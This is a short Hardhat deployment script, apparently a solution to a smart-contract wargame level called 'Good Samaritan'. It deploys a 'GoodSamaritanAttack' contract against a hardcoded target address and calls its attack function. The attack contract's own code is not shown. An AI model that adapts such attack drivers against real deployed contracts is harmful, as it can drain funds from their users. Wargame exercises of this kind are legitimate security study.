const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x56639dB16Ac50A89228026e42a316B30179A5376";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  // Deploy the GoodSamaritanAttackFactory Contract
  const GoodSamaritanAttackFactory = await ethers.getContractFactory(
    "GoodSamaritanAttack",
    signer
  );
  const goodSamaritan = await GoodSamaritanAttackFactory.deploy(
    CONTRACT_ADDRESS
  );
  await goodSamaritan.deployed();
  console.log("GoodSamaritanAttack deployed to:", goodSamaritan.address);
  await goodSamaritan.attack();
}
main().catch((error) => {
  console.error(error);
  process.exit(1);
});
